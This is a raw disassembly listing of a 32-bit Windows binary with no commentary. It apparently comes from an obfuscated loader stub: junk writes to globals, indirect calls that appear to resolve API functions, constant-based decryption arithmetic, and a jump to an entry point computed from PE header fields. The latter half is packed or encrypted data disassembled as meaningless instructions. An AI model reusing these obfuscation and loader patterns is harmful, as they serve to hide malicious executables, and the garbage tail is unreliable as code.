  42111d:	mov    DWORD PTR ds:0x428e7f,0x618e
  421127:	je     0x420849
  42112d:	mov    al,ds:0x428718
  421132:	mov    DWORD PTR ds:0x428ebb,0x5321
  42113c:	cmp    al,BYTE PTR ds:0x428729
  421142:	jne    0x420849
  421148:	mov    al,ds:0x428735
  42114d:	cmp    al,BYTE PTR ds:0x428746
  421153:	jne    0x420849
  421159:	adc    DWORD PTR ds:0x428ea7,0x4891
  421163:	push   0x42874f
  421168:	xor    DWORD PTR ds:0x428ecb,0x428ec3
  421172:	push   0x42875b
  421177:	call   edi
  421179:	xor    DWORD PTR ds:0x428ecb,0x428e67
  421183:	test   eax,eax
  421185:	mov    DWORD PTR ds:0x428e77,0x34d8
  42118f:	je     0x420849
  421195:	mov    DWORD PTR ds:0x428e63,0x47d8
  42119f:	mov    al,ds:0x428768
  4211a4:	mov    DWORD PTR ds:0x428ebb,0x60f8
  4211ae:	cmp    al,BYTE PTR ds:0x428779
  4211b4:	mov    DWORD PTR ds:0x428e63,0x352f
  4211be:	jne    0x420849
  4211c4:	mov    al,ds:0x428785
  4211c9:	mov    DWORD PTR ds:0x428e37,0x65de
  4211d3:	cmp    al,BYTE PTR ds:0x428796
  4211d9:	mov    DWORD PTR ds:0x428e3f,0x2ba7
  4211e3:	jne    0x420849
  4211e9:	push   0x42879f
  4211ee:	sbb    DWORD PTR ds:0x428e6b,0x25d3
  4211f8:	push   0x4287ab
  4211fd:	call   edi
  4211ff:	adc    DWORD PTR ds:0x428ebf,0x428ea3
  421209:	test   eax,eax
  42120b:	mov    DWORD PTR ds:0x428e6f,0x1c88
  421215:	je     0x420849
  42121b:	not    DWORD PTR ds:0x428e63
  421221:	mov    al,ds:0x4287b8
  421226:	cmp    al,BYTE PTR ds:0x4287c9
  42122c:	jne    0x420849
  421232:	mov    al,ds:0x4287d5
  421237:	mov    DWORD PTR ds:0x428e7b,0x5e30
  421241:	cmp    al,BYTE PTR ds:0x4287e6
  421247:	mov    DWORD PTR ds:0x428e9b,0x700f
  421251:	jne    0x420849
  421257:	or     DWORD PTR ds:0x428e83,0x99a
  421261:	push   0x4287ef
  421266:	adc    DWORD PTR ds:0x428e9f,0x22ee
  421270:	push   0x4287fb
  421275:	adc    DWORD PTR ds:0x428ecb,0x428ec3
  42127f:	call   edi
  421281:	sub    DWORD PTR ds:0x428e43,0x72f1
  42128b:	test   eax,eax
  42128d:	je     0x420849
  421293:	mov    DWORD PTR ds:0x428e57,0x70e
  42129d:	mov    al,ds:0x428808
  4212a2:	cmp    al,BYTE PTR ds:0x428819
  4212a8:	jne    0x420849
  4212ae:	mov    al,ds:0x428825
  4212b3:	mov    DWORD PTR ds:0x428ea3,0x4a62
  4212bd:	cmp    al,BYTE PTR ds:0x428836
  4212c3:	mov    DWORD PTR ds:0x428ea7,0x4507
  4212cd:	jne    0x420849
  4212d3:	sbb    DWORD PTR ds:0x428e23,0x428e6f
  4212dd:	push   0x42883f
  4212e2:	xor    DWORD PTR ds:0x428e2b,0x428e87
  4212ec:	push   0x42884b
  4212f1:	or     DWORD PTR ds:0x428e8f,0x428e6b
  4212fb:	call   edi
  4212fd:	test   eax,eax
  4212ff:	mov    DWORD PTR ds:0x428ec7,0x3c0e
  421309:	je     0x420849
  42130f:	mov    DWORD PTR ds:0x428e2f,0x1c83
  421319:	mov    al,ds:0x428858
  42131e:	cmp    al,BYTE PTR ds:0x428869
  421324:	jne    0x420849
  42132a:	mov    al,ds:0x428875
  42132f:	mov    DWORD PTR ds:0x428eab,0x7836
  421339:	cmp    al,BYTE PTR ds:0x428886
  42133f:	mov    DWORD PTR ds:0x428e33,0x5d16
  421349:	jne    0x420849
  42134f:	push   0x42888f
  421354:	or     DWORD PTR ds:0x428e6f,0x428e43
  42135e:	push   0x42889b
  421363:	adc    DWORD PTR ds:0x428e6f,0x64ad
  42136d:	call   edi
  42136f:	and    DWORD PTR ds:0x428e93,0x428eb3
  421379:	test   eax,eax
  42137b:	je     0x420849
  421381:	mov    al,ds:0x4288a8
  421386:	cmp    al,BYTE PTR ds:0x4288b9
  42138c:	mov    DWORD PTR ds:0x428e2b,0x5e8c
  421396:	jne    0x420849
  42139c:	mov    DWORD PTR ds:0x428ea3,0x4898
  4213a6:	mov    al,ds:0x4288c5
  4213ab:	cmp    al,BYTE PTR ds:0x4288d6
  4213b1:	jne    0x420849
  4213b7:	push   0x4288df
  4213bc:	push   0x4288eb
  4213c1:	call   edi
  4213c3:	test   eax,eax
  4213c5:	mov    DWORD PTR ds:0x428ebb,0xe84
  4213cf:	je     0x420849
  4213d5:	mov    al,ds:0x4288f8
  4213da:	cmp    al,BYTE PTR ds:0x428909
  4213e0:	mov    DWORD PTR ds:0x428e3b,0x418e
  4213ea:	jne    0x420849
  4213f0:	mov    DWORD PTR ds:0x428e5b,0x25d1
  4213fa:	mov    al,ds:0x428915
  4213ff:	cmp    al,BYTE PTR ds:0x428926
  421405:	mov    DWORD PTR ds:0x428e6b,0x4b5f
  42140f:	jne    0x420849
  421415:	push   0x42892f
  42141a:	adc    DWORD PTR ds:0x428ec7,0x4db7
  421424:	push   0x42893b
  421429:	sbb    DWORD PTR ds:0x428e6b,0x428ebf
  421433:	call   edi
  421435:	sub    DWORD PTR ds:0x428e33,0x428e97
  42143f:	test   eax,eax
  421441:	mov    DWORD PTR ds:0x428ec7,0x19ef
  42144b:	je     0x420849
  421451:	mov    al,ds:0x428948
  421456:	cmp    al,BYTE PTR ds:0x428959
  42145c:	jne    0x420849
  421462:	mov    al,ds:0x428965
  421467:	cmp    al,BYTE PTR ds:0x428976
  42146d:	jne    0x420849
  421473:	push   0x42897f
  421478:	push   0x42898b
  42147d:	call   edi
  42147f:	test   eax,eax
  421481:	je     0x420849
  421487:	mov    al,ds:0x428998
  42148c:	cmp    al,BYTE PTR ds:0x4289a9
  421492:	jne    0x420849
  421498:	mov    al,ds:0x4289b5
  42149d:	cmp    al,BYTE PTR ds:0x4289c6
  4214a3:	jne    0x420849
  4214a9:	push   0x4289cf
  4214ae:	push   0x4289db
  4214b3:	call   edi
  4214b5:	test   eax,eax
  4214b7:	je     0x420849
  4214bd:	mov    al,ds:0x4289e8
  4214c2:	cmp    al,BYTE PTR ds:0x4289f9
  4214c8:	jne    0x420849
  4214ce:	mov    al,ds:0x428a05
  4214d3:	cmp    al,BYTE PTR ds:0x428a16
  4214d9:	jne    0x420849
  4214df:	push   0x428a1f
  4214e4:	push   0x428a2b
  4214e9:	call   edi
  4214eb:	test   eax,eax
  4214ed:	je     0x420849
  4214f3:	mov    al,ds:0x428a38
  4214f8:	cmp    al,BYTE PTR ds:0x428a49
  4214fe:	jne    0x420849
  421504:	mov    al,ds:0x428a55
  421509:	cmp    al,BYTE PTR ds:0x428a66
  42150f:	jne    0x420849
  421515:	push   0x428a6f
  42151a:	push   0x428a7b
  42151f:	call   edi
  421521:	test   eax,eax
  421523:	je     0x420849
  421529:	mov    al,ds:0x428a88
  42152e:	cmp    al,BYTE PTR ds:0x428a99
  421534:	jne    0x420849
  42153a:	mov    al,ds:0x428aa5
  42153f:	cmp    al,BYTE PTR ds:0x428ab6
  421545:	jne    0x420849
  42154b:	push   0x428abf
  421550:	push   0x428acb
  421555:	call   edi
  421557:	test   eax,eax
  421559:	je     0x420849
  42155f:	mov    al,ds:0x428ad8
  421564:	cmp    al,BYTE PTR ds:0x428ae9
  42156a:	jne    0x420849
  421570:	mov    al,ds:0x428af5
  421575:	cmp    al,BYTE PTR ds:0x428b06
  42157b:	jne    0x420849
  421581:	push   0x428b0f
  421586:	push   0x428b1b
  42158b:	call   edi
  42158d:	test   eax,eax
  42158f:	je     0x420849
  421595:	mov    al,ds:0x428b28
  42159a:	cmp    al,BYTE PTR ds:0x428b39
  4215a0:	jne    0x420849
  4215a6:	mov    al,ds:0x428b45
  4215ab:	cmp    al,BYTE PTR ds:0x428b56
  4215b1:	jne    0x420849
  4215b7:	push   0x428b5f
  4215bc:	push   0x428b6b
  4215c1:	call   edi
  4215c3:	test   eax,eax
  4215c5:	je     0x420849
  4215cb:	mov    al,ds:0x428b78
  4215d0:	cmp    al,BYTE PTR ds:0x428b89
  4215d6:	jne    0x420849
  4215dc:	mov    al,ds:0x428b95
  4215e1:	cmp    al,BYTE PTR ds:0x428ba6
  4215e7:	jne    0x420849
  4215ed:	push   0x428baf
  4215f2:	push   0x428bbb
  4215f7:	call   edi
  4215f9:	test   eax,eax
  4215fb:	je     0x420849
  421601:	mov    al,ds:0x428bc8
  421606:	cmp    al,BYTE PTR ds:0x428bd9
  42160c:	jne    0x420849
  421612:	mov    al,ds:0x428be5
  421617:	cmp    al,BYTE PTR ds:0x428bf6
  42161d:	jne    0x420849
  421623:	push   0x428bff
  421628:	push   0x428c0b
  42162d:	call   edi
  42162f:	test   eax,eax
  421631:	je     0x420849
  421637:	mov    eax,DWORD PTR [esp+0x3c]
  42163b:	cmp    eax,0xf89c85a4
  421640:	je     0x42169f
  421646:	mov    eax,DWORD PTR [esp+0x20]
  42164a:	mov    ecx,DWORD PTR [esp+0x38]
  42164e:	xor    eax,esi
  421650:	add    eax,ebx
  421652:	cmp    eax,ecx
  421654:	je     0x42169f
  42165a:	mov    eax,ds:0x428373
  42165f:	mov    eax,DWORD PTR [eax+0x194]
  421665:	mov    ecx,DWORD PTR [eax]
  421667:	mov    eax,DWORD PTR [ecx+0x3c]
  42166a:	push   DWORD PTR ds:0x428453
  421670:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  421674:	push   DWORD PTR ds:0x4281f7
  42167a:	add    eax,ecx
  42167c:	mov    ecx,DWORD PTR ds:0x428373
  421682:	mov    ecx,DWORD PTR [ecx+0x194]
  421688:	push   DWORD PTR [ecx]
  42168a:	call   eax
  42168c:	mov    ecx,DWORD PTR ds:0x428373
  421692:	mov    ecx,DWORD PTR [ecx+0x1cc]
  421698:	mov    DWORD PTR [ecx],eax
  42169a:	jmp    0x421870
  42169f:	mov    eax,DWORD PTR [esp+0x20]
  4216a3:	mov    ecx,DWORD PTR [esp+0x40]
  4216a7:	xor    eax,esi
  4216a9:	add    eax,ebx
  4216ab:	cmp    eax,ecx
  4216ad:	jne    0x421718
  4216b3:	mov    eax,DWORD PTR [esp+0x20]
  4216b7:	mov    ecx,DWORD PTR ds:0x428373
  4216bd:	mov    ecx,DWORD PTR [ecx+0x198]
  4216c3:	xor    eax,esi
  4216c5:	add    eax,ebx
  4216c7:	cmp    eax,DWORD PTR [ecx]
  4216c9:	jne    0x4216f1
  4216cf:	mov    eax,DWORD PTR [esp+0x20]
  4216d3:	push   0xffffffff
  4216d5:	push   0x70941f91
  4216da:	xor    eax,esi
  4216dc:	add    eax,ebx
  4216de:	push   eax
  4216df:	push   0xf89c85a1
  4216e4:	push   DWORD PTR [esp+0x1c]
  4216e8:	push   DWORD PTR [esp+0x34]
  4216ec:	call   0x41b999
  4216f1:	push   DWORD PTR [esp+0xc]
  4216f5:	push   DWORD PTR [esp+0x24]
  4216f9:	call   0x401000
  4216fe:	mov    eax,DWORD PTR [esp+0x20]
  421702:	xor    eax,esi
  421704:	add    eax,ebx
  421706:	mov    ds:0x4283ff,eax
  42170b:	mov    eax,DWORD PTR [esp+0x20]
  42170f:	xor    eax,esi
  421711:	add    eax,ebx
  421713:	mov    ds:0x4283f7,eax
  421718:	mov    eax,DWORD PTR [esp+0x2c]
  42171c:	test   eax,eax
  42171e:	je     0x421870
  421724:	mov    DWORD PTR [esp+0x4c],0xf152c3c
  42172c:	mov    DWORD PTR [esp+0x54],0x712ed2f
  421734:	mov    DWORD PTR [esp+0x48],0x373fc0d
  42173c:	mov    DWORD PTR [esp+0x50],0x72670add
  421744:	call   0x41932f
  421749:	mov    eax,DWORD PTR [esp+0x34]
  42174d:	mov    eax,DWORD PTR [esp+0xc]
  421751:	mov    DWORD PTR [esp+0x30],eax
  421755:	mov    eax,DWORD PTR [esp+0x20]
  421759:	mov    DWORD PTR [esp+0xc],eax
  42175d:	mov    eax,eax
  42175f:	mov    eax,ds:0x428373
  421764:	mov    ecx,DWORD PTR [eax+0x1c0]
  42176a:	mov    edx,DWORD PTR [ecx]
  42176c:	and    DWORD PTR [esp+0x14],0x0
  421771:	mov    edi,0xfabdbed2
  421776:	add    edx,edi
  421778:	adc    DWORD PTR [esp+0x14],0xffffffff
  42177d:	mov    ecx,0x8a29a143
  421782:	xor    edx,ecx
  421784:	mov    DWORD PTR [esp+0x18],edx
  421788:	mov    edx,DWORD PTR [esp+0x14]
  42178c:	xor    edx,0x0
  42178f:	cmp    DWORD PTR [esp+0x18],0x70941f90
  421797:	mov    DWORD PTR [esp+0x1c],edx
  42179b:	jne    0x4217aa
  4217a1:	cmp    edx,0xffffffff
  4217a4:	je     0x421813
  4217aa:	mov    eax,DWORD PTR [eax+0x1c8]
  4217b0:	mov    eax,DWORD PTR [eax]
  4217b2:	cdq    
  4217b3:	add    eax,edi
  4217b5:	adc    edx,0xffffffff
  4217b8:	and    DWORD PTR [esp+0x14],0x0
  4217bd:	xor    edx,0x0
  4217c0:	mov    DWORD PTR [esp+0x24],edx
  4217c4:	mov    edx,DWORD PTR [esp+0xc]
  4217c8:	mov    DWORD PTR [esp+0x10],edx
  4217cc:	xor    eax,ecx
  4217ce:	add    DWORD PTR [esp+0x10],edi
  4217d2:	mov    edx,DWORD PTR [esp+0x10]
  4217d6:	adc    DWORD PTR [esp+0x14],0xffffffff
  4217db:	xor    edx,ecx
  4217dd:	mov    DWORD PTR [esp+0x18],edx
  4217e1:	mov    edx,DWORD PTR [esp+0x14]
  4217e5:	xor    edx,0x0
  4217e8:	mov    DWORD PTR [esp+0x1c],edx
  4217ec:	cmp    DWORD PTR [esp+0x18],eax
  4217f0:	jne    0x421802
  4217f6:	mov    eax,DWORD PTR [esp+0x24]
  4217fa:	cmp    edx,eax
  4217fc:	je     0x421813
  421802:	mov    eax,DWORD PTR [esp+0xc]
  421806:	add    eax,DWORD PTR [esp+0x30]
  42180a:	mov    DWORD PTR [esp+0xc],eax
  42180e:	jmp    0x421870
  421813:	mov    eax,ds:0x4283f7
  421818:	mov    edx,DWORD PTR ds:0x4283ff
  42181e:	xor    eax,edx
  421820:	mov    ds:0x4283f7,eax
  421825:	mov    edx,DWORD PTR ds:0x4283f7
  42182b:	mov    eax,DWORD PTR [esp+0x2c]
  42182f:	add    DWORD PTR [eax],edx
  421831:	mov    edx,DWORD PTR [esp+0xc]
  421835:	mov    eax,ds:0x4283f7
  42183a:	xor    edx,esi
  42183c:	add    edx,ebx
  42183e:	xor    ebx,ebx
  421840:	add    edx,edi
  421842:	adc    ebx,0xffffffff
  421845:	xor    esi,esi
  421847:	xor    edx,ecx
  421849:	xor    ebx,0x0
  42184c:	add    eax,edi
  42184e:	adc    esi,0xffffffff
  421851:	xor    eax,ecx
  421853:	xor    esi,0x0
  421856:	cmp    eax,edx
  421858:	jne    0x421870
  42185e:	cmp    esi,ebx
  421860:	jne    0x421870
  421866:	mov    eax,ds:0x4283f7
  42186b:	mov    ds:0x4283ff,eax
  421870:	mov    eax,ds:0x428373
  421875:	push   0x4
  421877:	add    eax,0x1cc
  42187c:	push   eax
  42187d:	lea    eax,[esp+0x3c]
  421881:	push   eax
  421882:	call   0x421896
  421887:	mov    eax,DWORD PTR [esp+0x34]
  42188b:	mov    eax,DWORD PTR [eax]
  42188d:	pop    edi
  42188e:	pop    esi
  42188f:	pop    ebx
  421890:	mov    esp,ebp
  421892:	pop    ebp
  421893:	ret    0xc
  421896:	push   ebp
  421897:	mov    ebp,esp
  421899:	sub    esp,0x10
  42189c:	mov    eax,0xf89c85a5
  4218a1:	mov    DWORD PTR [ebp-0x4],eax
  4218a4:	mov    DWORD PTR ds:0x428ecb,0x1d
  4218ae:	cmp    DWORD PTR ds:0x428ecb,0x0
  4218b5:	je     0x421906
  4218bb:	cmp    DWORD PTR ds:0x428ecb,0x8
  4218c2:	jg     0x421906
  4218c8:	jmp    0x4218d8
  4218cd:	push   0x428e77
  4218d2:	call   DWORD PTR ds:0x42aa27
  4218d8:	cmp    DWORD PTR ds:0x428ecb,0x9
  4218df:	jne    0x4218f2
  4218e5:	mov    edx,DWORD PTR ds:0x428ecb
  4218eb:	dec    edx
  4218ec:	mov    DWORD PTR ds:0x428ecb,edx
  4218f2:	xor    edx,edx
  4218f4:	add    edx,DWORD PTR ds:0x428ecb
  4218fa:	dec    edx
  4218fb:	mov    DWORD PTR ds:0x428ecb,edx
  421901:	jmp    0x4218ae
  421906:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  42190d:	xor    ecx,edx
  42190f:	mov    ecx,DWORD PTR [ebp-0x4]
  421912:	sbb    edx,0x5246
  421918:	push   esi
  421919:	or     DWORD PTR ds:0x428e5b,edi
  42191f:	mov    edx,0x75108af
  421924:	adc    DWORD PTR ds:0x428e43,0x2a82
  42192e:	xor    ecx,edx
  421930:	sbb    DWORD PTR ds:0x428e93,edi
  421936:	mov    esi,0x3272f6
  42193b:	push   edi
  42193c:	inc    DWORD PTR ds:0x428e47
  421942:	mov    edi,DWORD PTR [ebp+0x10]
  421945:	adc    DWORD PTR ds:0x428e43,0x428ecf
  42194f:	add    ecx,esi
  421951:	cmp    ecx,edi
  421953:	mov    DWORD PTR ds:0x428ea3,0x27d
  42195d:	je     0x421a9e
  421963:	mov    ecx,DWORD PTR ds:0x428e33
  421969:	or     DWORD PTR ds:0x428e2b,ecx
  42196f:	mov    ecx,DWORD PTR [ebp-0x4]
  421972:	mov    edi,DWORD PTR [ebp+0x10]
  421975:	xor    eax,eax
  421977:	xor    ecx,edx
  421979:	sub    DWORD PTR ds:0x428e2b,0x428e2f
  421983:	add    ecx,esi
  421985:	xor    DWORD PTR ds:0x428e6b,0x2e89
  42198f:	add    edi,0xfabdbed2
  421995:	mov    DWORD PTR ds:0x428e27,0xdb6
  42199f:	adc    eax,0xffffffff
  4219a2:	adc    DWORD PTR ds:0x428e23,0x428e77
  4219ac:	xor    eax,0x0
  4219af:	mov    DWORD PTR [ebp-0xc],eax
  4219b2:	push   ebx
  4219b3:	mov    eax,ds:0x428e37
  4219b8:	add    eax,DWORD PTR ds:0x428ebf
  4219be:	mov    ds:0x428e37,eax
  4219c3:	xor    ebx,ebx
  4219c5:	adc    DWORD PTR ds:0x428e4b,0x1a92
  4219cf:	xor    edi,0x8a29a143
  4219d5:	adc    eax,DWORD PTR ds:0x428e3b
  4219db:	mov    eax,ecx
  4219dd:	xor    DWORD PTR ds:0x428e4b,0x428e93
  4219e7:	add    eax,0xfabdbed2
  4219ec:	mov    DWORD PTR ds:0x428e2b,0x4aa
  4219f6:	adc    ebx,0xffffffff
  4219f9:	xor    eax,0x8a29a143
  4219fe:	and    DWORD PTR ds:0x428e9f,0x428e57
  421a08:	xor    ebx,0x0
  421a0b:	mov    DWORD PTR ds:0x428e3b,0x3b6d
  421a15:	cmp    eax,edi
  421a17:	jne    0x421a30
  421a1d:	cmp    ebx,DWORD PTR [ebp-0xc]
  421a20:	je     0x421a98
  421a26:	jmp    0x421a30
  421a2b:	mov    esi,0x3272f6
  421a30:	mov    eax,DWORD PTR [ebp-0x4]
  421a33:	mov    edi,DWORD PTR [ebp-0x8]
  421a36:	xor    edi,edx
  421a38:	add    edi,esi
  421a3a:	mov    esi,DWORD PTR [ebp+0x8]
  421a3d:	imul   edi,ecx
  421a40:	mov    ebx,DWORD PTR [ebp+0xc]
  421a43:	xor    eax,edx
  421a45:	add    eax,ecx
  421a47:	mov    al,BYTE PTR [ebx+eax*1+0x3272f6]
  421a4e:	mov    BYTE PTR [edi+esi*1],al
  421a51:	mov    eax,DWORD PTR [ebp-0x8]
  421a54:	mov    esi,DWORD PTR [ebp+0x10]
  421a57:	xor    eax,edx
  421a59:	xor    ebx,ebx
  421a5b:	add    esi,0xfabdbed2
  421a61:	adc    ebx,0xffffffff
  421a64:	lea    ecx,[ecx+eax*1+0x3272f6]
  421a6b:	xor    edi,edi
  421a6d:	xor    esi,0x8a29a143
  421a73:	xor    ebx,0x0
  421a76:	mov    eax,ecx
  421a78:	add    eax,0xfabdbed2
  421a7d:	adc    edi,0xffffffff
  421a80:	xor    eax,0x8a29a143
  421a85:	xor    edi,0x0
  421a88:	cmp    eax,esi
  421a8a:	jne    0x421a2b
  421a90:	cmp    edi,ebx
  421a92:	jne    0x421a2b
  421a98:	mov    eax,0xf89c85a4
  421a9d:	pop    ebx
  421a9e:	pop    edi
  421a9f:	pop    esi
  421aa0:	leave  
  421aa1:	ret    0xc
  421aa4:	push   ebp
  421aa5:	mov    ebp,esp
  421aa7:	push   ecx
  421aa8:	dec    eax
  421aa9:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  421ab0:	mov    ecx,DWORD PTR ds:0x428ea7
  421ab6:	sub    DWORD PTR ds:0x428e93,ecx
  421abc:	jmp    0x423e02
  421ac1:	loope  0x421acb
  421ac3:	jg     0x421b24
  421ac5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ac6:	add    al,0xe1
  421ac8:	test   BYTE PTR [ecx-0x4b42adb6],al
  421ace:	out    dx,al
  421acf:	mov    ebp,0x82b66fb3
  421ad4:	sbb    DWORD PTR [edx+0x60],0xffffff83
  421ad8:	or     DWORD PTR [edx+0x2f6791dc],0xffffffb8
  421adf:	dec    esp
  421ae0:	mul    esp
  421ae2:	xchg   BYTE PTR [esi-0x11],bh
  421ae5:	sub    BYTE PTR [ebp+0x76],0x1b
  421ae9:	ffree  st(3)
  421aeb:	xchg   DWORD PTR [edi+0x35],esp
  421aee:	mov    bl,0xc0
  421af0:	jg     0x421ac1
  421af2:	sbb    eax,0x1270b9e5
  421af7:	sbb    al,0xe0
  421af9:	mov    ebp,0x79e2d6b7
  421afe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421aff:	adc    eax,0xf06eb458
  421b04:	jb     0x421b69
  421b06:	loop   0x421b7c
  421b08:	mov    dh,0x1b
  421b0a:	lea    edi,[esi+0x44]
  421b0d:	fmul   st(1),st
  421b10:	mov    dl,0xee
  421b12:	xchg   ecx,eax
  421b13:	nop
  421b14:	fcom   DWORD PTR [eax]
  421b16:	jbe    0x421afb
  421b18:	push   esi
  421b19:	pop    ebx
  421b1a:	aam    0xd
  421b1c:	out    dx,al
  421b1d:	hlt    
  421b1e:	scas   eax,DWORD PTR es:[edi]
  421b1f:	pop    eax
  421b20:	call   0x86b0:0x9bd5b195
  421b27:	mov    eax,DWORD PTR [eax]
  421b29:	popf   
  421b2a:	mov    dh,0x90
  421b2c:	push   edi
  421b2d:	jp     0x421b87
  421b2f:	fsubr  st,st(1)
  421b31:	bound  esi,QWORD PTR [ecx+0x20]
  421b34:	fdivr  DWORD PTR [esi]
  421b36:	mov    esp,ds
  421b38:	inc    ecx
  421b39:	push   esp
  421b3a:	mov    eax,ds:0x49ecd436
  421b3f:	inc    ebp
  421b40:	in     eax,0x33
  421b42:	jecxz  0x421af6
  421b44:	jae    0x421bb6
  421b46:	pushfw 
  421b48:	push   ss
  421b49:	and    ah,0x63
  421b4c:	(bad)  [edi-0x9]
  421b4f:	aaa    
  421b50:	push   esi
  421b51:	cmp    al,BYTE PTR ds:0x7886f971
  421b57:	pop    ebp
  421b58:	pop    es
  421b59:	outs   dx,BYTE PTR ds:[esi]
  421b5a:	sbb    al,0x29
  421b5c:	clc    
  421b5d:	push   0x7b113f67
  421b62:	call   0x8c16:0x8b7e9926
  421b69:	into   
  421b6a:	leave  
  421b6b:	in     al,0x5b
  421b6d:	fwait
  421b6e:	nop
  421b6f:	and    eax,0x1e7a2caa
  421b74:	add    eax,0x316c40c5
  421b79:	pop    ebx
  421b7a:	and    DWORD PTR [edi],edi
  421b7c:	jl     0x421b66
  421b7e:	jg     0x421b38
  421b80:	dec    esi
  421b81:	mov    edx,0x2282cbd7
  421b86:	test   BYTE PTR [eax],dh
  421b88:	shr    DWORD PTR [ebx+0x73],1
  421b8b:	jle    0x421b46
  421b8d:	xor    ecx,esp
  421b8f:	mov    ebx,0x59c29cb9
  421b94:	pop    edi
  421b95:	inc    eax
  421b96:	ins    BYTE PTR es:[edi],dx
  421b97:	imul   ebp,ebp,0x88fd2dcb
  421b9d:	sub    BYTE PTR [edx],bh
  421b9f:	or     edx,DWORD PTR [ecx+0x52]
  421ba2:	cs push ss
  421ba4:	outs   dx,DWORD PTR ds:[esi]
  421ba5:	mov    WORD PTR [edi+0x7896182a],fs
  421bab:	sbb    BYTE PTR [eax],bh
  421bad:	ror    DWORD PTR [esi+0x74f21242],0x90
  421bb4:	mov    al,0x3
  421bb6:	mov    al,ds:0x12bc1287
  421bbb:	int    0x69
  421bbd:	xchg   ecx,eax
  421bbe:	lock dec edi
  421bc0:	js     0x421c2f
  421bc2:	das    
  421bc3:	dec    BYTE PTR [eax-0x8]
  421bc6:	mov    BYTE PTR [edi],cl
  421bc8:	repz xor DWORD PTR [esi-0x57d18cbf],ebx
  421bcf:	cmp    edi,DWORD PTR [edx]
  421bd1:	ret    
  421bd2:	imul   ecx,DWORD PTR [esi+edi*4-0x5a2a3220],0xffffffa3
  421bda:	cmp    al,0xfe
  421bdc:	fmul   st(7),st
  421bde:	popf   
  421bdf:	jo     0x421ba0
  421be1:	mov    ebx,fs
  421be3:	jge    0x421be9
  421be5:	cmp    DWORD PTR [edi+0x67],0xffffff95
  421be9:	jns    0x421c3d
  421beb:	jnp    0x421bfe
  421bed:	repnz or eax,0xf1d71fb1
  421bf3:	imul   BYTE PTR ds:0xd168c727
  421bf9:	pop    eax
  421bfa:	jbe    0x421c11
  421bfc:	xchg   DWORD PTR [esi+esi*1-0x6b83a80f],edx
  421c03:	stos   DWORD PTR es:[edi],eax
  421c04:	pusha  
  421c05:	rcr    BYTE PTR [ecx],0xa6
  421c08:	in     al,dx
  421c09:	(bad)  
  421c0a:	ds sti 
  421c0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c0d:	add    edi,DWORD PTR [eax-0x51]
  421c10:	dec    edx
  421c11:	outs   dx,BYTE PTR ds:[esi]
  421c12:	and    al,0x70
  421c14:	push   ecx
  421c15:	mov    edi,0xdeb5663f
  421c1a:	(bad)  
  421c1b:	push   edi
  421c1c:	inc    ebx
  421c1d:	inc    ebx
  421c1e:	rol    BYTE PTR [ecx],0xeb
  421c21:	xor    ch,dh
  421c23:	inc    eax
  421c24:	ins    BYTE PTR es:[edi],dx
  421c25:	(bad)  [eax]
  421c27:	fldenv ds:0xc052c3b1
  421c2d:	ds gs data16 mov bl,0xe5
  421c32:	into   
  421c33:	jecxz  0x421c2d
  421c35:	aam    0x55
  421c37:	mov    ds:0x34b9d240,eax
  421c3c:	xchg   BYTE PTR [ebp-0x6289e029],cl
  421c42:	sbb    DWORD PTR [ebx-0x6a],ebx
  421c45:	ja     0x421c5f
  421c47:	cmp    DWORD PTR [eax-0x30],edx
  421c4a:	mov    eax,ds:0x1725ed15
  421c4f:	rcl    DWORD PTR [edi],0x92
  421c52:	mov    edi,0x78059b46
  421c57:	aam    0xb4
  421c59:	and    DWORD PTR [ebx],ebp
  421c5b:	ret    
  421c5c:	cli    
  421c5d:	in     al,0x2a
  421c5f:	mov    al,0x2c
  421c61:	jle    0x421c25
  421c63:	mov    eax,0x680fbbb3
  421c68:	xor    al,0x90
  421c6a:	outs   dx,DWORD PTR ds:[esi]
  421c6b:	mov    cl,0x1c
  421c6d:	jmp    0xde23:0x5e695d75
  421c74:	int3   
  421c75:	push   0x514d6a14
  421c7a:	sub    DWORD PTR [esi],eax
  421c7c:	add    al,0x85
  421c7e:	dec    edi
  421c7f:	fcomp  QWORD PTR [edx+0xf3fb5c6]
  421c85:	jp     0x421c5c
  421c87:	ss sub al,0xa1
  421c8a:	inc    eax
  421c8b:	mov    ecx,DWORD PTR [ebp+0xd77936c]
  421c91:	enter  0x9699,0x24
  421c95:	in     eax,0xf0
  421c97:	sbb    al,0xdf
  421c99:	pop    ss
  421c9a:	test   al,0x9
  421c9c:	sbb    edx,ebx
  421c9e:	ret    
  421c9f:	outs   dx,DWORD PTR ds:[esi]
  421ca0:	cmp    bh,BYTE PTR [esi]
  421ca2:	adc    al,0x79
  421ca4:	lea    ecx,[ebp+0x33]
  421ca7:	dec    esi
  421ca8:	and    ah,al
  421caa:	lods   al,BYTE PTR ds:[esi]
  421cab:	jecxz  0x421c55
  421cad:	xchg   edi,eax
  421cae:	mov    eax,0x5e3c0fa8
  421cb3:	out    dx,al
  421cb4:	add    eax,0x692df941
  421cb9:	inc    edx
  421cba:	aas    
  421cbb:	xor    edi,DWORD PTR [edi-0x28f191d]
  421cc1:	mov    cl,0xcf
  421cc3:	mov    al,0xe6
  421cc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421cc6:	std    
  421cc7:	mov    ah,0x1
  421cc9:	cli    
  421cca:	jge    0x421c9f
  421ccc:	xchg   edi,eax
  421ccd:	cmp    bh,al
  421ccf:	ss imul esi,DWORD PTR cs:[ebx],0x58
  421cd4:	pushf  
  421cd5:	sbb    dl,BYTE PTR [eax-0x2c]
  421cd8:	sub    al,0x4
  421cda:	mov    esp,0x35a3863e
  421cdf:	clc    
  421ce0:	ror    DWORD PTR [ebx-0x17],0x8
  421ce4:	fwait
  421ce5:	sbb    edi,0x4d
  421ce8:	add    al,BYTE PTR [edx+0x5a]
  421ceb:	cmp    eax,0x88a0c978
  421cf0:	xchg   ebx,eax
  421cf1:	or     al,ah
  421cf3:	sub    esi,edi
  421cf5:	in     eax,dx
  421cf6:	push   0xf5fded88
  421cfb:	aas    
  421cfc:	mov    cl,0x3c
  421cfe:	xlat   BYTE PTR ds:[ebx]
  421cff:	jnp    0x421d12
  421d01:	adc    al,0x52
  421d03:	aam    0xc4
